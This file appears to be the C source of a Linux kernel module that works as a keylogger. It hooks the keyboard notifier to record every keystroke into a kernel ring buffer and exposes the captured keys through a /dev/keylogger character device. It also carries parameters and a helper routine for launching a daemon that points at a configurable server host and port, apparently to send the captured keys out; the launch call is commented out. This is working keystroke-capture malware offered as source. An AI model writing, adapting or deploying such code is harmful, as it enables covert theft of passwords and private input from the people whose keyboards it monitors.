#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/init.h>
#include <linux/device.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/kmod.h>
#include <linux/mutex.h>
#include <asm/uaccess.h>

#define DEVICE_NAME "keylogger"     /* dev name as it appears in /proc/devices and /dev/ */
#define CLASS_NAME  "keylog"
#define BUFFER_LEN 2048

MODULE_LICENSE("GPL");              /* General Public License - required by keyboard_notifier */

static char *daemon;
static char *host = "127.0.0.1";
static char *port = "2000";

module_param(daemon, charp, 0000);
MODULE_PARM_DESC(daemon, "Path to daemon executable file");
module_param(host, charp, 0000);
MODULE_PARM_DESC(host, "Server address");
module_param(port, charp, 0000);
MODULE_PARM_DESC(port, "Server port");

static int major;                   /* major number assigned to device driver */
static struct class *keyloggerClass;
static struct device *keyloggerDevice;

static unsigned char dev_buffer[BUFFER_LEN];
static unsigned short begin = 0;
static unsigned short end = 0;
static unsigned char omittedKeys = 0;

/* The prototype functions for the character driver */
static int     device_open(struct inode *, struct file *);
static int     device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);

static struct file_operations fops =
{
    .read = device_read,
    .write = device_write,
    .open = device_open,
    .release = device_release
};

static int is_device_full(void)
{
    return (end + 1) % BUFFER_LEN == begin;
}

static int start_deamon(void)
{
    struct subprocess_info *sub_info;

    char *argv[] = {daemon, host, port, NULL};
    static char *envp[] = {
            "HOME=/",
            "TERM=linux",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL);
    if (sub_info == NULL)
    {
        return -ENOMEM;
    }

    return call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
}

static int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code != KBD_KEYCODE)
    {
        /* log keys only coming from keyboard */
        return NOTIFY_OK;
    }

    mutex_lock(&keyloggerDevice->mutex);

    if (!is_device_full())
    {
        if (omittedKeys)
        {
            dev_buffer[end] = (unsigned char) 2;
            end = (end + 1) % BUFFER_LEN;
            dev_buffer[end] = (unsigned char) omittedKeys;
            end = (end + 1) % BUFFER_LEN;
            omittedKeys = 0;
        }
        else
        {
            dev_buffer[end] = (unsigned char) param->down;
            end = (end + 1) % BUFFER_LEN;
            dev_buffer[end] = (unsigned char) param->value;
            end = (end + 1) % BUFFER_LEN;
        }
    }
    else if (omittedKeys < 255)
    {
        omittedKeys++;
    }

    mutex_unlock(&keyloggerDevice->mutex);

    return NOTIFY_OK;
}

static struct notifier_block nb =
{
    .notifier_call = log_key
};

static int __init keylogger_init(void)
{
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0)
    {
        printk(KERN_ALERT "Failed to register character device\n");
        return major;
    }

    keyloggerClass = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(keyloggerClass))
    {
        unregister_chrdev(major, DEVICE_NAME);
        printk(KERN_ALERT "Failed to register device class\n");
        return PTR_ERR(keyloggerClass);
    }

    keyloggerDevice = device_create(keyloggerClass, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
    if (IS_ERR(keyloggerDevice))
    {
        class_destroy(keyloggerClass);
        unregister_chrdev(major, DEVICE_NAME);
        printk(KERN_ALERT "Failed to create the device\n");
        return PTR_ERR(keyloggerDevice);
    }

    register_keyboard_notifier(&nb);
    mutex_init(&keyloggerDevice->mutex);

    //start_deamon()
    return 0;
}

static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&nb);
    device_destroy(keyloggerClass, MKDEV(major, 0));
    class_unregister(keyloggerClass);
    class_destroy(keyloggerClass);
    unregister_chrdev(major, DEVICE_NAME);
}

module_init(keylogger_init);
module_exit(keylogger_exit);

static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
{
    unsigned short bytes_read;
    printk(KERN_ALERT "read \n");
    mutex_lock(&keyloggerDevice->mutex);

    /* copy data from the kernel data segment to the user data segment */
    for (bytes_read = 0; begin != end && bytes_read <= length; begin = (begin + 1) % BUFFER_LEN, ++bytes_read)
    {
        put_user(dev_buffer[begin], buffer + bytes_read);
    }

    mutex_unlock(&keyloggerDevice->mutex);

    return bytes_read;
}

static ssize_t device_write(struct file *filp, const char *buff, size_t len, loff_t *off)
{
    /* Unsupported operation */
    return -EINVAL;
}

static int device_open(struct inode *inode, struct file *file)
{
    printk(KERN_ALERT "open\n");
    return 0;
}

static int device_release(struct inode *inode, struct file *file)
{
    printk(KERN_ALERT "release\n");
    return 0;
}